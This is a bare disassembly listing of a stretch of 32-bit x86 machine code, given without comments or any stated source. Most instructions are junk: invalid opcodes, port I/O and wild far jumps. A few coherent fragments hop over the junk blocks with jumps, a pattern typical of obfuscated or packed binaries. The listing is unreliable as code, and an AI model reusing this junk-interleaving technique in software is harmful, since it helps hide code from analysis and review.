  40c84a:	or     bl,bh
  40c84c:	rcl    DWORD PTR [esp+edx*4],1
  40c84f:	xor    al,0x55
  40c851:	(bad)  
  40c852:	ror    BYTE PTR [edi+eiz*4-0x520b3f78],cl
  40c859:	jl     0x40c80d
  40c85b:	jo     0x40c8a5
  40c85d:	outs   dx,DWORD PTR ds:[esi]
  40c85e:	inc    ebx
  40c85f:	pop    esi
  40c860:	push   eax
  40c861:	popa   
  40c862:	add    dl,cl
  40c864:	data16 int3 
  40c866:	sub    BYTE PTR [edx-0x21990caf],ch
  40c86c:	inc    esp
  40c86d:	sub    bh,BYTE PTR [ecx]
  40c86f:	sub    bh,BYTE PTR [ebp+0x54]
  40c872:	call   0xb693b5b3
  40c877:	jg     0x40c85f
  40c879:	inc    edi
  40c87a:	ret    0xbd50
  40c87d:	std    
  40c87e:	ss jle 0x40c8ab
  40c881:	xor    al,0x8f
  40c883:	xchg   DWORD PTR [edx],esi
  40c885:	xchg   edx,eax
  40c886:	retf   
  40c887:	mov    bh,0x22
  40c889:	ror    ecx,1
  40c88b:	dec    ebp
  40c88c:	xchg   ebp,eax
  40c88d:	mov    eax,DWORD PTR [ebp+0xc]
  40c890:	add    eax,DWORD PTR [ebp+0x8]
  40c893:	mov    DWORD PTR [ebp-0x10],eax
  40c896:	mov    eax,DWORD PTR [ebp-0x1c]
  40c899:	test   eax,eax
  40c89b:	je     0x40d717
  40c8a1:	mov    DWORD PTR [ebp-0x24],esi
  40c8a4:	push   0xb
  40c8a6:	pop    ecx
  40c8a7:	push   0x5
  40c8a9:	jmp    0x40ca07
  40c8ae:	stos   DWORD PTR es:[edi],eax
  40c8af:	xchg   DWORD PTR [eax-0x42c643da],ecx
  40c8b5:	fwait
  40c8b6:	adc    bh,bl
  40c8b8:	hlt    
  40c8b9:	call   0xf3f7:0x6028f45d
  40c8c0:	jle    0x40c940
  40c8c2:	aas    
  40c8c3:	jg     0x40c943
  40c8c5:	jle    0x40c862
  40c8c7:	dec    edi
  40c8c8:	int3   
  40c8c9:	mov    cl,0x2f
  40c8cb:	shl    DWORD PTR [edx-0x3432e627],0x31
  40c8d2:	lock pop esi
  40c8d4:	mov    bh,0xb8
  40c8d6:	xor    ecx,ecx
  40c8d8:	add    eax,0xe757d7dd
  40c8dd:	fnstsw WORD PTR [ecx-0x2a]
  40c8e0:	les    ebp,FWORD PTR [edx+0x4585dac0]
  40c8e6:	je     0x40c92c
  40c8e8:	xor    BYTE PTR [esi+0x72add1d2],dl
  40c8ee:	sbb    BYTE PTR [eax-0x11],0xe1
  40c8f2:	sbb    eax,0x76eb7bb
  40c8f7:	cmp    BYTE PTR [eax+0x6],bl
  40c8fa:	mov    es,WORD PTR [edx]
  40c8fc:	cwde   
  40c8fd:	ficomp WORD PTR [ecx+0x6415d4f]
  40c903:	das    
  40c904:	sub    DWORD PTR [eax],edx
  40c906:	call   FWORD PTR [ebp+0x5a]
  40c909:	push   ebp
  40c90a:	xchg   edi,eax
  40c90b:	mov    edx,0x874b0b87
  40c910:	add    esp,ebp
  40c912:	out    0x75,al
  40c914:	es mov al,0x91
  40c917:	(bad)  
  40c918:	cmp    BYTE PTR [ecx+0x1a],al
  40c91b:	scas   eax,DWORD PTR es:[edi]
  40c91c:	repz pop esp
  40c91e:	pop    es
  40c91f:	push   0x9c522e3
  40c924:	sub    ecx,ebx
  40c926:	add    ah,BYTE PTR [edx]
  40c928:	loop   0x40c96c
  40c92a:	out    dx,al
  40c92b:	or     DWORD PTR [eax+0x1b],ebx
  40c92e:	int    0xcb
  40c930:	and    esi,ecx
  40c932:	cwde   
  40c933:	mov    eax,ds:0xa3ae3da8
  40c938:	dec    esi
  40c939:	mov    dl,0xd5
  40c93b:	test   DWORD PTR [edi-0x27],esp
  40c93e:	(bad)  
  40c940:	jp     0x40c94e
  40c942:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c943:	pop    ds
  40c944:	inc    ebx
  40c945:	ja     0x40c97c
  40c947:	pop    ebx
  40c948:	repnz int3 
  40c94a:	lea    ecx,[edi+edx*1-0x76]
  40c94e:	inc    ebx
  40c94f:	sar    DWORD PTR [edi-0x17],1
  40c952:	xchg   esi,eax
  40c953:	dec    esp
  40c954:	(bad)  
  40c955:	sti    
  40c956:	jge    0x40c97c
  40c958:	inc    esi
  40c959:	retf   0xd428
  40c95c:	shl    BYTE PTR [eax],1
  40c95e:	cmp    bl,BYTE PTR [edi-0x40]
  40c961:	adc    DWORD PTR [ebx*1+0x4e266b11],esp
  40c968:	push   ss
  40c969:	(bad)  
  40c96a:	sub    BYTE PTR [esi+eiz*1-0x143d7106],ch
  40c971:	icebp  
  40c972:	std    
  40c973:	hlt    
  40c974:	xor    ebp,DWORD PTR ds:0x4d72b01f
  40c97a:	daa    
  40c97b:	and    edi,esp
  40c97d:	pop    edx
  40c97e:	dec    ebx
  40c97f:	(bad)  
  40c981:	xchg   edx,esi
  40c983:	icebp  
  40c984:	mov    ebp,0x98dd54db
  40c989:	sbb    BYTE PTR [esi],ch
  40c98b:	into   
  40c98c:	sbb    DWORD PTR [esi+0x7c3b894a],0x0
  40c993:	imul   edx,DWORD PTR [ebp-0x6c],0xffffffde
  40c997:	jg     0x40ca08
  40c999:	popf   
  40c99a:	adc    edx,DWORD PTR [ecx+eax*4]
  40c99d:	sbb    BYTE PTR [edi-0x5c],bh
  40c9a0:	mov    bl,BYTE PTR [edx+0x2c]
  40c9a3:	(bad)  
  40c9a4:	shr    DWORD PTR [ebx],cl
  40c9a6:	stos   BYTE PTR es:[edi],al
  40c9a7:	in     eax,dx
  40c9a8:	sbb    ebx,DWORD PTR [esi]
  40c9aa:	arpl   WORD PTR [edx-0x5],dx
  40c9ad:	fsubr  st(3),st
  40c9af:	mov    al,ds:0x11b6107b
  40c9b4:	retf   
  40c9b5:	pop    eax
  40c9b6:	in     eax,0x6e
  40c9b8:	aam    0xf1
  40c9ba:	jmp    0x5879b1d7
  40c9bf:	hlt    
  40c9c0:	mov    esp,0xcd0d7d70
  40c9c5:	fist   DWORD PTR [esi+0x6bf081ad]
  40c9cb:	sbb    DWORD PTR [eax],ecx
  40c9cd:	jno    0x40c9f6
  40c9cf:	out    0x68,eax
  40c9d1:	xor    DWORD PTR [esp+ebp*1],0xffffffb3
  40c9d5:	jg     0x40c9f4
  40c9d7:	pop    ds
  40c9d8:	ja     0x40c9c3
  40c9da:	inc    ecx
  40c9db:	mov    ds:0xf1dcb600,eax
  40c9e0:	xchg   edx,eax
  40c9e1:	xchg   esp,eax
  40c9e2:	dec    esp
  40c9e3:	xchg   BYTE PTR [esi],dh
  40c9e5:	adc    ebx,esi
  40c9e7:	jp     0x40c9dc
  40c9e9:	dec    edx
  40c9ea:	mov    cl,0xbd
  40c9ec:	adc    BYTE PTR [edi-0x6a],dl
  40c9ef:	mov    ah,0x32
  40c9f1:	and    DWORD PTR [edi+0x1ee741f6],esp
  40c9f7:	outs   dx,DWORD PTR ds:[esi]
  40c9f8:	out    dx,al
  40c9f9:	shl    BYTE PTR [ebx+0x1b],1
  40c9fc:	sahf   
  40c9fd:	out    dx,eax
  40c9fe:	stos   DWORD PTR es:[edi],eax
  40c9ff:	ret    0x53db
  40ca02:	in     eax,0x52
  40ca04:	lahf   
  40ca05:	jle    0x40ca63
  40ca07:	dec    ecx
  40ca08:	jmp    0x40cb66
  40ca0d:	and    DWORD PTR [esi+eax*2+0x65fd5b1b],edx
  40ca14:	lods   al,BYTE PTR ds:[esi]
  40ca15:	retf   
  40ca16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca17:	sub    eax,0xb15583cf
  40ca1c:	mov    edx,0x7e7ef448
  40ca21:	aas    
  40ca22:	jg     0x40caa2
  40ca24:	jle    0x40ca48
  40ca26:	in     al,0x8c
  40ca28:	mov    al,0xc2
  40ca2a:	sbb    ebp,DWORD PTR [esi+ebp*2+0x3a]
  40ca2e:	adc    dh,BYTE PTR [ebx]
  40ca30:	adc    DWORD PTR [ecx+0x7292faba],edx
  40ca36:	cmp    eax,0x2bb9b0b4
  40ca3b:	in     eax,0x9c
  40ca3d:	push   0x4abce5d3
  40ca42:	add    ebp,edi
  40ca44:	enter  0x3bd7,0x60
  40ca48:	or     DWORD PTR [ecx-0x54],ecx
  40ca4b:	xchg   esp,eax
  40ca4c:	dec    edi
  40ca4d:	or     eax,0xeee68b64
  40ca52:	scas   al,BYTE PTR es:[edi]
  40ca53:	inc    eax
  40ca54:	out    dx,al
  40ca55:	aaa    
  40ca56:	jle    0x40cab6
  40ca58:	lods   al,BYTE PTR ds:[esi]
  40ca59:	cmp    esp,DWORD PTR [ecx]
  40ca5b:	(bad)  
  40ca5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca5d:	div    cl
  40ca5f:	pop    es
  40ca60:	mov    ch,0xa8
  40ca62:	xor    cl,BYTE PTR [ebx+0xaa60041]
  40ca68:	jmp    0x40ca9a
  40ca6a:	mov    dl,0xe0
  40ca6c:	repnz es xchg edi,eax
  40ca6f:	mov    eax,es:0x7223814b
  40ca75:	vmread DWORD PTR [esi+0x64],esi
  40ca79:	hlt    
  40ca7a:	shr    DWORD PTR [ecx-0x43c9a63d],1
  40ca80:	push   edx
  40ca81:	or     al,0x83
  40ca83:	out    dx,eax
  40ca84:	add    al,ch
  40ca86:	stos   DWORD PTR es:[edi],eax
  40ca87:	mov    edi,DWORD PTR [ebp-0x13]
  40ca8a:	xor    al,0x5a
  40ca8c:	sub    al,BYTE PTR [edx]
  40ca8e:	cmp    DWORD PTR [esi+0x2644ced2],edx
  40ca94:	xchg   ebx,eax
  40ca95:	rcr    BYTE PTR [edx],1
  40ca97:	test   al,0x2b
  40ca99:	xchg   edx,eax
  40ca9a:	jae    0x40cab5
  40ca9c:	daa    
  40ca9d:	xchg   edx,eax
  40ca9e:	sub    BYTE PTR [edx+0x7c],dh
  40caa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caa2:	mov    esp,DWORD PTR [ebp+0x15]
  40caa5:	sahf   
  40caa6:	sbb    ecx,ebx
  40caa8:	push   ebp
  40caa9:	dec    esi
  40caaa:	arpl   bx,dx
  40caac:	push   es
  40caad:	frstor [ebx]
  40caaf:	mov    ecx,0x18fc6163
  40cab4:	stos   BYTE PTR es:[edi],al
  40cab5:	pop    ds
  40cab6:	jb     0x40ca79
  40cab8:	mov    dh,0x2
  40caba:	sbb    DWORD PTR [edi+0x17],esi
  40cabd:	push   edi
  40cabe:	push   esp
  40cabf:	xor    BYTE PTR [esi+0x46],dl
  40cac2:	pop    edi
  40cac3:	pop    edx
  40cac4:	sub    BYTE PTR [ecx+0x691cb2d2],0x89
  40cacb:	xchg   esp,eax
  40cacc:	lahf   
  40cacd:	out    0xeb,eax
  40cacf:	shl    edx,cl
  40cad1:	sbb    eax,0x7a9d07a3
  40cad6:	in     al,dx
  40cad7:	push   ss
  40cad8:	pop    ss
  40cad9:	lods   eax,DWORD PTR ds:[esi]
  40cada:	mov    DWORD PTR [eax-0x1],edi
  40cadd:	daa    
  40cade:	dec    ebx
  40cadf:	cs je  0x40cae2
  40cae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cae3:	in     al,dx
  40cae4:	dec    edi
  40cae5:	es in  al,dx
  40cae7:	popa   
  40cae8:	push   ds
  40cae9:	pop    esp
  40caea:	popa   
  40caeb:	fcmovnb st,st(7)
  40caed:	ss stos BYTE PTR es:[edi],al
  40caef:	lahf   
  40caf0:	mov    DWORD PTR [ecx],ecx
  40caf2:	xor    esi,DWORD PTR [ebp-0x64]
  40caf5:	nop
  40caf6:	enter  0x24df,0xf5
  40cafa:	cmp    al,0x61
  40cafc:	loop   0x40caec
  40cafe:	rol    al,0xce
  40cb01:	loop   0x40cb0f
  40cb03:	clc    
  40cb04:	pop    edx
  40cb05:	sbb    esp,esi
  40cb07:	in     al,0x71
  40cb09:	mov    ch,0x9d
  40cb0b:	mov    dl,0x17
  40cb0d:	inc    ebx
  40cb0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb0f:	inc    edx
  40cb10:	(bad)  
  40cb11:	rcl    ecx,1
  40cb13:	sub    al,0x77
  40cb15:	ficomp DWORD PTR [edi-0x9798616]
  40cb1b:	sub    ebp,DWORD PTR [edx+0x46689fe6]
  40cb21:	imul   esi,DWORD PTR [eax-0x10],0x63
  40cb25:	jmp    0x40cb33
  40cb27:	pop    eax
  40cb28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb29:	dec    ebx
  40cb2a:	adc    bh,cl
  40cb2c:	test   eax,0x7a4b489f
  40cb31:	out    dx,eax
  40cb32:	test   DWORD PTR [eax+0x72],eax
  40cb35:	ins    BYTE PTR es:[edi],dx
  40cb36:	jle    0x40caf9
  40cb38:	test   eax,0xaab2503e
  40cb3d:	fisubr DWORD PTR [esi]
  40cb3f:	fwait
  40cb40:	jg     0x40cb63
  40cb42:	push   0xb0000640
  40cb47:	or     eax,0x6f60be01
  40cb4c:	sbb    DWORD PTR [ebp-0x10],ecx
  40cb4f:	pop    esi
  40cb50:	nop
  40cb51:	ror    DWORD PTR [edi],1
  40cb53:	cmp    ch,BYTE PTR [ecx]
  40cb55:	pop    edi
  40cb56:	jp     0x40cae3
  40cb58:	sbb    BYTE PTR [ecx],ch
  40cb5a:	ins    BYTE PTR es:[edi],dx
  40cb5b:	add    ch,ah
  40cb5d:	pop    esi
  40cb5e:	in     eax,0x63
  40cb60:	cdq    
  40cb61:	pop    ecx
  40cb62:	mov    WORD PTR [ebp-0x77],es
  40cb65:	std    
  40cb66:	pop    ebx
  40cb67:	xchg   ebx,ecx
  40cb69:	sub    ebx,ecx
  40cb6b:	xchg   ebx,ecx
  40cb6d:	dec    ecx
  40cb6e:	mov    eax,DWORD PTR [ebp-0x1c]
  40cb71:	imul   eax,ecx
  40cb74:	sub    esp,eax
  40cb76:	mov    DWORD PTR [ebp-0x24],esp
  40cb79:	jmp    0x40ccd7
  40cb7e:	jp     0x40cb94
  40cb80:	rcr    eax,0x59
  40cb83:	std    
  40cb84:	jnp    0x40cb1a
  40cb86:	mov    BYTE PTR [ebp-0x29],ch
  40cb89:	jl     0x40cb41
  40cb8b:	ror    BYTE PTR [eax+edx*2+0x7e7ef609],0x3f
  40cb93:	jg     0x40cc13
  40cb95:	jle    0x40cb5d
  40cb97:	mov    cl,0x77
  40cb99:	into   
  40cb9a:	or     edi,DWORD PTR [ebx+0x5d]
  40cb9d:	out    0xce,eax
  40cb9f:	ins    BYTE PTR es:[edi],dx
  40cba0:	push   0xffffff85
  40cba2:	or     DWORD PTR [ebx+0x5d],eax
  40cba5:	pop    ebp
  40cba6:	or     DWORD PTR [ecx],ebp
  40cba8:	inc    esp
  40cba9:	adc    ebx,DWORD PTR [edx+eiz*4+0x3a4adb49]
  40cbb0:	add    eax,eax
  40cbb2:	dec    cx
  40cbb4:	in     eax,dx
  40cbb5:	ret    
  40cbb6:	stos   BYTE PTR es:[edi],al
  40cbb7:	adc    cl,BYTE PTR [ebx]
  40cbb9:	les    ebp,FWORD PTR [ecx]
  40cbbb:	mov    esp,0x38062f3b
  40cbc0:	cld    
  40cbc1:	dec    ecx
  40cbc2:	inc    ebx
  40cbc3:	mov    ebp,cs
  40cbc5:	call   FWORD PTR [edx]
  40cbc7:	ss in  al,dx
  40cbc9:	pop    ecx
  40cbca:	add    DWORD PTR [ecx],0x7e
  40cbcd:	out    dx,eax
  40cbce:	pop    ebx
  40cbcf:	out    dx,al
  40cbd0:	add    BYTE PTR [edx],dh
  40cbd2:	dec    edx
  40cbd3:	push   ebp
  40cbd4:	jmp    0xb2d4d170
  40cbd9:	test   al,0x1f
  40cbdb:	fxch   st(6)
  40cbdd:	add    eax,0xd0cc3bea
  40cbe2:	mov    ebp,0xfb77a1af
  40cbe7:	mov    ch,0x6e
  40cbe9:	cmp    bh,BYTE PTR [eax-0xcfe9d70]
  40cbef:	cmp    BYTE PTR [edi-0x6d588c3],ah
  40cbf5:	fwait
  40cbf6:	repnz push esp
  40cbf8:	or     eax,0x4717a7a1
  40cbfd:	dec    esi
  40cbfe:	(bad)  
  40cbff:	dec    DWORD PTR [ecx+edi*1-0x4f]
  40cc03:	push   ebx
  40cc04:	call   0x5dccace3
  40cc09:	add    bl,BYTE PTR [edx]
  40cc0b:	mov    ch,0x12
  40cc0d:	(bad)  
  40cc0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc0f:	push   edi
  40cc10:	push   edx
  40cc11:	shl    BYTE PTR [eax+0x592f13dc],cl
  40cc17:	fsubr  DWORD PTR [esi]
  40cc19:	dec    ebp
  40cc1a:	inc    edx
  40cc1b:	jmp    0x63aa0a16
  40cc20:	cmp    ebx,esi
  40cc22:	push   ss
  40cc23:	mov    ebx,0x2edc57b1
  40cc28:	push   ebx
  40cc29:	icebp  
  40cc2a:	(bad)  
  40cc2b:	enter  0x1001,0x68
  40cc2f:	pop    edi
  40cc30:	mov    bl,0x28
  40cc32:	xchg   esp,eax
  40cc33:	sti    
  40cc34:	dec    eax
  40cc35:	cs dec edx
  40cc37:	fidiv  DWORD PTR [ebp+0x18]
  40cc3a:	inc    ecx
  40cc3b:	(bad)  
  40cc3c:	adc    ecx,DWORD PTR [esi-0x66c90102]
  40cc42:	push   esp
  40cc43:	ror    BYTE PTR [eiz*4-0x144c9ff5],0xa9
  40cc4b:	add    DWORD PTR [ecx],0xffffff9b
  40cc4e:	mov    ecx,0x947b15ae
  40cc53:	cld    
  40cc54:	sbb    esi,DWORD PTR [ebp+ecx*4-0x10b130ad]
  40cc5b:	fdiv   st,st(2)
  40cc5d:	mov    DWORD PTR [eax+eax*2-0x74859736],ecx
  40cc64:	xchg   BYTE PTR [eax],al
  40cc66:	rcr    ah,cl
  40cc68:	outs   dx,BYTE PTR ds:[esi]
  40cc69:	push   ss
  40cc6a:	or     BYTE PTR [esi],0x18
  40cc6d:	inc    ecx
  40cc6e:	cmp    DWORD PTR [eax+0xf],ebp
  40cc71:	sbb    BYTE PTR [ebp-0x1a],0xa6
  40cc75:	jmp    0x96936c02
  40cc7a:	cmp    al,0xd2
  40cc7c:	pop    ds
  40cc7d:	xchg   BYTE PTR [eax*4+0x3e5c983d],al
  40cc84:	imul   BYTE PTR [edi+0x58]
  40cc87:	jmp    0x40cce3
  40cc89:	push   cs
  40cc8a:	enter  0x1ca9,0xa
  40cc8e:	pop    ebp
  40cc8f:	cmc    
  40cc90:	fisub  DWORD PTR [ebp+0x419e5fd8]
  40cc96:	es ins BYTE PTR es:[edi],dx
  40cc98:	mov    dh,0xc3
  40cc9a:	push   esp
  40cc9b:	xlat   BYTE PTR ds:[ebx]
  40cc9c:	mov    edi,0xaab3506e
  40cca1:	(bad)  
  40cca2:	jb     0x40cc31
  40cca4:	enter  0x7bcd,0x29
  40cca8:	pop    ecx
  40cca9:	mov    bh,0x88
  40ccab:	ret    0x6135
  40ccae:	mov    ebx,0x74c0b193
  40ccb3:	nop
  40ccb4:	sti    
  40ccb5:	xchg   edx,eax
  40ccb6:	xchg   esp,eax
  40ccb7:	lahf   
  40ccb8:	jmp    0x3a4af55e
  40ccbd:	mov    dh,0xe
  40ccbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccc0:	add    BYTE PTR [edi],0x71
  40ccc3:	data16 mov ah,0x9f
  40ccc6:	(bad)  
  40ccc7:	sub    al,0xbb
  40ccc9:	in     al,0xb9
  40cccb:	shr    BYTE PTR [eax],cl
  40cccd:	ds sbb al,ah
  40ccd0:	ds inc edx
  40ccd2:	js     0x40cce3
  40ccd4:	jne    0x40cd54
  40ccd6:	inc    esp
  40ccd7:	mov    eax,DWORD PTR [ebp-0x4]
  40ccda:	mov    ecx,0x7510856
  40ccdf:	jmp    0x40ce3d
  40cce4:	test   DWORD PTR [ebx+0x4e],esi
  40cce7:	test   al,0x40
  40cce9:	jge    0x40cd68
  40cceb:	cmp    edi,DWORD PTR ds:0xec1d3a
  40ccf1:	out    dx,al
  40ccf2:	out    0xb,eax
  40ccf4:	retf   0x7ef7
  40ccf7:	jle    0x40cd38
  40ccf9:	jg     0x40cd79
  40ccfb:	jle    0x40cd7c
  40ccfd:	xor    bh,dl
  40ccff:	test   BYTE PTR [edi-0x6a7dce0b],ch
  40cd05:	bound  ebp,QWORD PTR [ebx-0x2381b0e4]
  40cd0b:	test   al,0x9c
  40cd0d:	out    0x4b,al
  40cd0f:	push   ecx
  40cd10:	loopne 0x40cd76
  40cd12:	pop    ebx
  40cd13:	push   ss
  40cd14:	test   DWORD PTR [edx+eax*4+0x2b08ba75],edi
  40cd1b:	xchg   edi,eax
  40cd1c:	ret    
  40cd1d:	mov    BYTE PTR [ecx],dh
  40cd1f:	or     BYTE PTR [ebx+0x4a9d0fce],dl
  40cd25:	stos   DWORD PTR es:[edi],eax
  40cd26:	pop    ebx
  40cd27:	mov    cl,0xcf
  40cd29:	je     0x40cd11
  40cd2b:	(bad)  
  40cd2c:	jmp    0xaf4f5772
  40cd31:	sub    al,0x80
  40cd33:	mov    WORD PTR [esi],ss
  40cd35:	pop    ebx
  40cd36:	bound  ecx,QWORD PTR [esi+0x3c559f00]
  40cd3c:	mov    al,ds:0xff05dd73
  40cd41:	mul    DWORD PTR [esi+0x0]
  40cd44:	pop    ebx
  40cd45:	inc    edi
  40cd46:	das    
  40cd47:	mov    esp,0x5c422443
  40cd4c:	xchg   edi,eax
  40cd4d:	jb     0x40cd20
  40cd4f:	lods   eax,DWORD PTR ds:[esi]
  40cd50:	sub    eax,0x8aeed065
  40cd55:	or     ah,BYTE PTR ds:[ebx]
  40cd58:	ror    BYTE PTR [ebx-0x7912382d],cl
  40cd5e:	stc    
  40cd5f:	xchg   edx,eax
  40cd60:	dec    edx
  40cd61:	movsx  edi,cl
  40cd64:	xchg   BYTE PTR [esi-0x42dedb34],bh
  40cd6a:	adc    dh,BYTE PTR [edi+0x28]
  40cd6d:	adc    eax,0x54277f55
  40cd72:	fdiv   DWORD PTR [ecx-0x51123219]
  40cd78:	aaa    
  40cd79:	xor    eax,0x267c1a8c
  40cd7e:	pop    ebx
  40cd7f:	je     0x40cde7
  40cd81:	outs   dx,BYTE PTR ds:[esi]
  40cd82:	mov    eax,0xebc23bb5
  40cd87:	sbb    al,0x39
  40cd89:	mov    ecx,0x25ad43c
  40cd8e:	(bad)  
  40cd8f:	mov    DWORD PTR [ebp-0x4532faa2],eax
  40cd95:	inc    edx
  40cd96:	retf   0x8ebd
  40cd99:	jo     0x40ce12
  40cd9b:	rol    BYTE PTR [edi-0x45],0x73
  40cd9f:	sub    al,0x29
  40cda1:	and    eax,0xbd8d1b1f
  40cda6:	fs leave 
  40cda8:	and    BYTE PTR [edi],0x37
  40cdab:	pop    ebp
  40cdac:	lods   al,BYTE PTR ds:[esi]
  40cdad:	ret    0x87f0
  40cdb0:	test   eax,0x83d9df51
  40cdb5:	jp     0x40cdf3
  40cdb7:	and    dh,BYTE PTR [edi+0x5f]
  40cdba:	cli    
  40cdbb:	sbb    eax,ebx
  40cdbd:	jns    0x40cd7a
  40cdbf:	cmp    al,0xae
  40cdc1:	test   BYTE PTR [ebp-0x35902128],dh
  40cdc7:	adc    BYTE PTR [esi-0x2b],dl
  40cdca:	sub    DWORD PTR [ebx+esi*1],ebx
  40cdcd:	inc    edx
  40cdce:	jno    0x40cdf1
  40cdd0:	es sbb eax,ecx
  40cdd3:	into   
  40cdd4:	xor    BYTE PTR [esi+ebp*2+0x15],0x63
  40cdd9:	jmp    0x1127a6be
  40cdde:	popf   
  40cddf:	lods   eax,DWORD PTR ds:[esi]
  40cde0:	or     eax,0x943b0973
  40cde5:	add    ecx,edx
  40cde7:	test   DWORD PTR [ecx],edi
  40cde9:	mov    al,0x9d
  40cdeb:	jg     0x40cd95
  40cded:	test   DWORD PTR [edi+0x43],0xe0bd3524
  40cdf4:	dec    eax
  40cdf5:	jge    0x40cdd4
  40cdf7:	test   BYTE PTR [ebp-0x49],bl
  40cdfa:	add    BYTE PTR [edx],ch
  40cdfc:	loope  0x40ce7a
  40cdfe:	sbb    BYTE PTR [ecx-0x5a],bh
  40ce01:	shl    DWORD PTR [ecx-0x310ff4b1],cl
  40ce07:	push   0xffffffe7
  40ce09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce0b:	in     eax,0xd8
  40ce0d:	jne    0x40cdb4
  40ce0f:	xor    eax,0x8282f3a6
  40ce14:	adc    eax,0x28e1d3ac
  40ce19:	adc    cl,BYTE PTR [esi+eiz*4]
  40ce1c:	mov    eax,0x1f86d333
  40ce21:	jb     0x40cea0
  40ce23:	push   es
  40ce24:	adc    eax,0xe86672a5
  40ce29:	sbb    al,0xb5
  40ce2b:	adc    al,0x65
  40ce2d:	mov    esi,0xf45adb31
  40ce32:	push   ebp
  40ce33:	cmc    
  40ce34:	sbb    cl,BYTE PTR ds:0x9a66b1b0
  40ce3a:	sbb    dl,BYTE PTR [eax+0x2d]
  40ce3d:	xor    eax,ecx
  40ce3f:	mov    edx,0x32729d
  40ce44:	add    eax,edx
  40ce46:	jmp    0x40cfa4
  40ce4b:	mov    dl,0xd7
  40ce4d:	or     al,0x5b
  40ce4f:	lods   eax,DWORD PTR ds:[esi]
  40ce50:	jge    0x40ce97
  40ce52:	out    0xb5,eax
  40ce54:	mov    ds:0x9dd85331,eax
  40ce59:	mov    ecx,0x7e888b0f
  40ce5e:	jle    0x40ce9f
  40ce60:	jg     0x40cee0
  40ce62:	jle    0x40ce62
  40ce64:	and    BYTE PTR [edx+edi*8],0x7
  40ce68:	push   0x62
  40ce6a:	(bad)  
  40ce6b:	adc    al,0x37
  40ce6d:	sahf   
  40ce6e:	xor    edi,DWORD PTR [ecx+0xa]
  40ce71:	xor    ah,bh
  40ce73:	lds    ecx,FWORD PTR [edx+0x36]
  40ce76:	mov    ebx,0x386af749
  40ce7b:	push   ebx
  40ce7c:	sub    eax,0x7705309c
  40ce81:	mov    bl,0xfe
  40ce83:	sar    BYTE PTR [ecx-0x32],1
  40ce86:	adc    bl,al
  40ce88:	fisubr DWORD PTR [ebx]
  40ce8a:	(bad)  
  40ce8d:	xchg   esi,eax
  40ce8e:	dec    edi
  40ce8f:	jg     0x40ce5c
  40ce91:	push   esp
  40ce92:	mov    bl,0xfa
  40ce94:	fcomp  DWORD PTR [eax+0x34]
  40ce97:	jg     0x40ceb4
  40ce99:	ficomp DWORD PTR [esp+eax*4]
  40ce9c:	or     al,dl
  40ce9e:	mov    ch,0x68
  40cea0:	inc    ecx
  40cea1:	mov    eax,ds:0x156b1b5e
  40cea6:	and    ax,0x1ddb
  40ceaa:	push   edx
  40ceab:	ss (bad) 
  40cead:	hlt    
  40ceae:	in     eax,dx
  40ceaf:	aas    
  40ceb0:	popa   
  40ceb1:	loop   0x40ce83
  40ceb3:	lods   eax,DWORD PTR ds:[esi]
  40ceb4:	mov    edi,0x4c962ce7
  40ceb9:	sti    
  40ceba:	ret    0x87ef
  40cebd:	cmp    BYTE PTR gs:[ebx],ah
  40cec0:	sub    eax,0x76930c11
  40cec5:	popa   
  40cec6:	loop   0x40ce4f
  40cec8:	clc    
  40cec9:	aaa    
  40ceca:	lock enter 0x9203,0x77
  40cecf:	xor    al,BYTE PTR [ebx-0x26]
  40ced2:	lock jno 0x40cecb
  40ced5:	dec    edi
  40ced6:	in     al,dx
  40ced7:	sub    al,0xa2
  40ced9:	or     ebx,ecx
  40cedb:	cmp    DWORD PTR [edi-0x4986286e],eax
  40cee1:	(bad)  
  40cee2:	(bad)  
  40cee3:	cmc    
  40cee4:	cmp    edi,ecx
  40cee6:	and    eax,0x43f430b6
  40ceeb:	sub    dl,ch
  40ceed:	push   es
  40ceee:	push   0x38
  40cef0:	sub    DWORD PTR [edx+0x3b],ebx
  40cef3:	rcr    DWORD PTR [edx],cl
  40cef5:	push   ebp
  40cef6:	stos   BYTE PTR es:[edi],al
  40cef7:	or     eax,0x792017e4
  40cefc:	in     eax,dx
  40cefd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cefe:	jae    0x40ce90
  40cf00:	arpl   WORD PTR [eax+0xb0cac14],bx
  40cf06:	mov    al,ds:0xad84f876
  40cf0b:	inc    esp
  40cf0c:	out    dx,eax
  40cf0d:	shl    BYTE PTR [eax],1
  40cf0f:	fiadd  WORD PTR [eax]
  40cf11:	add    ah,BYTE PTR [edi+0x72]
  40cf14:	outs   dx,BYTE PTR ds:[esi]
  40cf15:	in     eax,dx
  40cf16:	sti    
  40cf17:	call   0x3bc6:0xe9b73a1c
  40cf1e:	fst    QWORD PTR [ecx+0x1e]
  40cf21:	push   esp
  40cf22:	mov    bl,BYTE PTR [edx-0x6f]
  40cf25:	(bad)  
  40cf27:	pop    ds
  40cf28:	push   es
  40cf29:	xor    ecx,edi
  40cf2b:	popa   
  40cf2c:	mov    dh,0xec
  40cf2e:	out    dx,al
  40cf2f:	loope  0x40cf07
  40cf31:	mov    bh,0x5f
  40cf33:	loopne 0x40ced6
  40cf35:	(bad)  
  40cf36:	in     al,dx
  40cf37:	push   edi
  40cf38:	mov    esp,0x8ea82b40
  40cf3d:	and    al,0xd7
  40cf3f:	out    dx,al
  40cf40:	xchg   ebx,eax
  40cf41:	jp     0x40cfb4
  40cf43:	add    al,0x7f
  40cf45:	sub    ebp,0x19
  40cf48:	(bad)  
  40cf49:	jg     0x40cf04
  40cf4b:	test   eax,0x8d9ac878
  40cf50:	jecxz  0x40cee2
  40cf52:	add    BYTE PTR [edx],0xb0
  40cf55:	sbb    edx,DWORD PTR [edi-0x434216c7]
